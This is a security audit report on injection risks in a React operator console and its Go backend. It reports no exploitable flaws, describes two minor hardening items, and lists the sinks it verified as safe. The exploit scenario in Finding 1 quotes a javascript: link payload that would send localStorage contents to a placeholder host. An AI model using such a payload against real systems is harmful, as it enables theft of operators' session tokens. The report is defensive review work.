# Injection-class results (sc-xss, sc-sqli, sc-nosqli, sc-graphql, sc-ssti, sc-xxe, sc-ldap, sc-header-injection)

Scope: frontend/src (React 19.2 console, embedded by kernel/webui) + Go backend sinks.
Date: 2026-09-11. Method: sink discovery, then tracing each source to its sink and confirming whether it is reachable.

## Summary

No exploitable injection vulnerabilities confirmed (no Critical/High/Medium issues). There are 2 Low/Informational hardening items.
The main path, LLM output or channel-inbound text reaching the operator console as stored XSS, is closed.

| # | Title | Severity | Confidence |
|---|-------|----------|------------|
| 1 | ACP registry `website`/`repository` URL rendered as href without scheme allowlist | Low (defense-in-depth) | 60 |
| 2 | `sanitizeFilename` does not strip other control / non-ASCII chars in Content-Disposition | Informational | 40 |

---

## Finding 1 — Remote-registry URL used as href without safeHref

- Severity: Low | CWE-79 (CWE-601 adjacent) | Confidence: 60
- Source: `kernel/acpcatalog/registry.go:318` sets `Docs: firstNonEmpty(a.Website, a.Repository)`. The value comes from the remote CDN JSON (`OfficialRegistryURL`). `validateRegistry` (registry.go:182-226) checks id, env keys and distribution, but not the scheme of URL fields.
- Sink: `frontend/src/features/agents/components/ACPAgents.tsx:165`
  ```tsx
  <a href={a.docs} target="_blank" rel="noreferrer">
  ```
- Exploit scenario: if the ACP CDN/registry were compromised (or `DefaultRegistry.URL` pointed elsewhere), an agent entry with `"website":"javascript:fetch('//x/'+localStorage…)"` would be placed into the console origin. React 19 replaces `javascript:` hrefs with a throwing stub, so execution is currently blocked by the framework, not by the app. `data:`/other schemes open in a new tab (top-level `data:` navigation is blocked by browsers). The residual risk is phishing links (arbitrary https) plus dependence on React's guard.
- Fix: pass through `safeHref()` from `frontend/src/lib/markdown.ts` (as BookmarksView does), and/or reject non-`https://` `website`/`repository`/`icon` in `validateRegistry`.

## Finding 2 — Content-Disposition filename sanitization is minimal

- Severity: Informational | CWE-113 / CWE-116 | Confidence: 40
- Locations: `kernel/webui/artifact_route.go:53-54,79-90` and `kernel/webui/files_route.go:377-379`
  ```go
  w.Header().Set("Content-Disposition", "attachment; filename=\""+name+"\"")
  ```
- `sanitizeFilename` strips `\ / " \r \n`, so a quoted-string breakout and CRLF splitting are not possible (regression test INJ-003 exists in files_route_test.go). Go's header writer also neutralizes CR/LF. Other control characters and non-ASCII characters pass through raw. The worst impact is a mangled filename on some browsers. It cannot inject a parameter or a header.
- Fix (optional): drop runes < 0x20 and 0x7f, and emit RFC 6266 `filename*=UTF-8''<pct-encoded>` for non-ASCII (`mime.FormatMediaType("attachment", map[string]string{"filename": name})`).

---

## Verified-safe (candidates dropped as FPs)

- **Chat/agent/memory/tool Markdown**: `frontend/src/lib/markdown.ts` is a hand-written AST parser. It renders through React children, with no `dangerouslySetInnerHTML` and no raw HTML. Links go through `safeHref` (http/https/mailto only; md.ts:42-44). Otherwise the link is rendered as literal text. `Markdown.tsx:162-172` uses `rel="noopener noreferrer nofollow"`. JSON fences become data widgets and code goes to Monaco; neither is an HTML sink.
- **Repo-wide sink grep** found zero occurrences of `dangerouslySetInnerHTML`, `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `eval`, `new Function`, `location.href=` assignment, `postMessage`/`message` listeners, mermaid, rehype-raw/`allowDangerousHtml`.
- **HTML artifact preview**: `features/artifacts/components/page.tsx:590-599` uses `<iframe srcDoc sandbox="" referrerPolicy="no-referrer">`. It has no allow-scripts and no allow-same-origin, so it gets an opaque origin and cannot reach the token.
- **PDF artifacts**: `artifacts.tsx:163-172` renders them as a blob URL in an `iframe sandbox=""`.
- **SVG and image artifacts** render through `<img>` (blob URL), so no script runs.
- **Raw artifact route** (`artifact_route.go`): Content-Type is allowlisted, everything else becomes octet-stream, and nosniff is set. SVG additionally gets a `CSP: sandbox; default-src 'none'`, which blocks direct navigation to stored SVG XSS. `files_route.go` always serves octet-stream with nosniff.
- **Bookmarks** (`data/components/page.tsx:691`) use `safeHref`. `mailto:` + field value cannot change the scheme.
- **`window.open(r.authorize_url, …, "noopener,noreferrer")`** in setup/models/channels: the URL comes from the daemon's own OAuth-start response.
- **`docs_url`** (channels) comes from a static Go channel registry (`kernel/channel/registry.go`). The voice "Get one" link is a component prop from static presets.
- **SMTP header injection** (`plugins/channels/email/email.go:190-231`): the Subject is cut at the first CR or LF (M479). `To` must exactly match an operator allowlist entry (`kernel/channel/channel.go:129`), so a CRLF-bearing recipient is rejected. `From` comes from config. The Python `emailtools/scripts/mail.py` uses `EmailMessage()` (default policy), which raises on CR/LF in header values.
- **SQL/NoSQL**: no `database/sql`, no SQLite driver, no Mongo, and no query-string construction anywhere. sqlite3 appears only as a Toolbox CLI catalog entry.
- **SSTI**: no `text/template`/`html/template` imports and no `template.HTML(...)` casts.
- **XXE**: `encoding/xml` is used in `kernel/creds/sts.go`, `web_identity.go` and `plugins/channels/wecom/wecom.go`. Go's encoding/xml does not resolve external entities or DTDs, so XXE is not possible.
- **LDAP / GraphQL**: neither exists in the codebase.
- **Response headers from request input**: none. Aside from the sanitized filename above, no `Header().Set/Add` uses `r.URL`, `r.Header`, `Query()` or `FormValue`.
